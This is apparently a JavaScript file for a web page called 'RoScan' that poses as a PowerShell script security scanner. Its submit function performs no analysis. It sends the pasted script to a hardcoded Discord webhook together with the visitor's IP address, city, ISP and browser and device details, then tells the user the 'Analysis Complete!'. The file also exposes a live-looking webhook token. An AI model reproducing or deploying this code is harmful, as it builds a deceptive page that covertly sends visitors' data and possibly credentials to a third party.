// Theme toggle functionality
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    
    // Update button text and icon
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    if (newTheme === 'dark') {
        themeIcon.textContent = '☀️';
        themeText.textContent = 'Light';
    } else {
        themeIcon.textContent = '🌙';
        themeText.textContent = 'Dark';
    }
    
    // Save theme preference
    localStorage.setItem('theme', newTheme);
}

// Load saved theme on page load
function loadTheme() {
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.documentElement.setAttribute('data-theme', savedTheme);
    
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    if (savedTheme === 'dark') {
        themeIcon.textContent = '☀️';
        themeText.textContent = 'Light';
    } else {
        themeIcon.textContent = '🌙';
        themeText.textContent = 'Dark';
    }
}

// Modal functionality
function openScanModal() {
    console.log('Opening scan modal...');
    const modal = document.getElementById('scanModal');
    if (modal) {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden'; // Prevent background scrolling
        console.log('Modal opened successfully');
    } else {
        console.error('Modal element not found!');
    }
}

function closeScanModal() {
    document.getElementById('scanModal').style.display = 'none';
    document.body.style.overflow = 'auto';
    document.getElementById('powershellInput').value = ''; // Clear input
}

// Generate unique session ID for tracking
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Get user location information
async function getUserLocation() {
    try {
        // Try multiple IP location services for better accuracy
        const services = [
            'https://ipapi.co/json/',
            'https://api.ipify.org?format=json',
            'https://ipinfo.io/json'
        ];
        
        let locationData = {
            ip: 'Unknown',
            country: 'Unknown',
            region: 'Unknown', 
            city: 'Unknown',
            isp: 'Unknown'
        };

        // Try the primary service first
        try {
            const response = await fetch('https://ipapi.co/json/', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                locationData = {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            }
        } catch (error) {
            console.log('Primary location service failed, trying fallback...');
            
            // Fallback to ipinfo.io
            try {
                const fallbackResponse = await fetch('https://ipinfo.io/json');
                if (fallbackResponse.ok) {
                    const fallbackData = await fallbackResponse.json();
                    locationData = {
                        ip: fallbackData.ip || 'Unknown',
                        country: fallbackData.country || 'Unknown',
                        region: fallbackData.region || 'Unknown',
                        city: fallbackData.city || 'Unknown',
                        isp: fallbackData.org || 'Unknown'
                    };
                }
            } catch (fallbackError) {
                console.log('Fallback location service also failed');
            }
        }

        return locationData;
    } catch (error) {
        console.error('Location detection failed:', error);
        return {
            ip: 'Location detection failed',
            country: 'Unknown',
            region: 'Unknown',
            city: 'Unknown',
            isp: 'Unknown'
        };
    }
}

// Secure webhook submission
async function submitPowerShell() {
    const input = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const powershellScript = input.value.trim();
    
    if (!powershellScript) {
        alert('Please paste a PowerShell script before submitting.');
        return;
    }

    // Disable button and show loading state
    submitBtn.disabled = true;
    submitBtn.textContent = 'Analyzing...';

    try {
        // Discord webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
        
        // Get user location info
        const locationInfo = await getUserLocation();
        
        // Format for Discord webhook with @everyone ping
        const payload = {
            content: "@everyone 🚨 **URGENT: New PowerShell Scan Detected** 🚨",
            embeds: [{
                title: "⚠️ PowerShell Script Analysis - IMMEDIATE ATTENTION REQUIRED",
                color: 15158332, // Red color for urgency
                fields: [
                    {
                        name: "📅 Timestamp",
                        value: new Date().toISOString(),
                        inline: true
                    },
                    {
                        name: "🆔 Session ID",
                        value: generateSessionId(),
                        inline: true
                    },
                    {
                        name: "🌍 Location Information",
                        value: `**Country:** ${locationInfo.country}\n**Region:** ${locationInfo.region}\n**City:** ${locationInfo.city}\n**ISP:** ${locationInfo.isp}\n**IP:** ${locationInfo.ip}`,
                        inline: false
                    },
                    {
                        name: "🖥️ System Information",
                        value: `**Browser:** ${navigator.userAgent.split('(')[1]?.split(')')[0] || 'Unknown'}\n**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}`,
                        inline: false
                    },
                    {
                        name: "🌐 Network Details",
                        value: `**Connection:** ${navigator.connection?.effectiveType || 'Unknown'}\n**Online:** ${navigator.onLine ? 'Yes' : 'No'}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
                        inline: false
                    },
                    {
                        name: "⚡ PowerShell Script Content",
                        value: "```powershell\n" + powershellScript.substring(0, 1500) + (powershellScript.length > 1500 ? "\n... (truncated)" : "") + "\n```",
                        inline: false
                    }
                ],
                footer: {
                    text: "🔍 RoScan Security Analysis - CRITICAL ALERT"
                },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            submitBtn.textContent = 'Analysis Complete!';
            submitBtn.style.background = '#10b981'; // Green success color
            
            setTimeout(() => {
                closeScanModal();
                // Reset button state
                submitBtn.disabled = false;
                submitBtn.textContent = 'Scanning PowerShell';
                submitBtn.style.background = '';
            }, 2000);
        } else {
            throw new Error('Analysis failed');
        }
    } catch (error) {
        console.error('Submission error:', error);
        submitBtn.textContent = 'Analysis Failed - Retry';
        submitBtn.style.background = '#ef4444'; // Red error color
        
        setTimeout(() => {
            submitBtn.disabled = false;
            submitBtn.textContent = 'Scanning PowerShell';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Copy to clipboard functionality
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        console.log('Copied to clipboard successfully');
    }).catch(function(err) {
        console.error('Failed to copy to clipboard: ', err);
    });
}

// Form validation enhancement
function validatePowerShellInput(script) {
    const trimmed = script.trim();
    if (trimmed.length < 3) {
        return { valid: false, message: 'PowerShell script too short' };
    }
    if (trimmed.length > 10000) {
        return { valid: false, message: 'PowerShell script too long (max 10,000 characters)' };
    }
    return { valid: true, message: 'Valid' };
}

// Enhanced error handling
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 8px;
        color: white;
        font-weight: 500;
        z-index: 10000;
        animation: slideIn 0.3s ease-out;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
    `;
    notification.textContent = message;
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing RoScan...');
    // Load theme
    loadTheme();
    
    // Close modal when clicking outside of it
    window.addEventListener('click', function(event) {
        const modal = document.getElementById('scanModal');
        if (event.target === modal) {
            closeScanModal();
        }
    });

    // Add click interaction to scan area
    const scanArea = document.querySelector('.scan-area');
    if (scanArea) {
        scanArea.addEventListener('click', function() {
            this.style.borderColor = 'var(--primary-blue)';
            setTimeout(() => {
                this.style.borderColor = 'var(--border-color)';
            }, 1000);
        });
    }

    // Auto-resize textarea based on content
    const textarea = document.getElementById('powershellInput');
    if (textarea) {
        textarea.addEventListener('input', function() {
            this.style.height = 'auto';
            this.style.height = Math.min(this.scrollHeight, 400) + 'px';
        });
    }

    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
});

// Keyboard shortcuts
document.addEventListener('keydown', function(event) {
    // ESC to close modal
    if (event.key === 'Escape') {
        const modal = document.getElementById('scanModal');
        if (modal.style.display === 'block') {
            closeScanModal();
        }
    }
    
    // Ctrl+Enter to submit PowerShell (when modal is open)
    if ((event.ctrlKey || event.metaKey) && event.key === 'Enter') {
        const modal = document.getElementById('scanModal');
        if (modal.style.display === 'block') {
            event.preventDefault();
            submitPowerShell();
        }
    }
});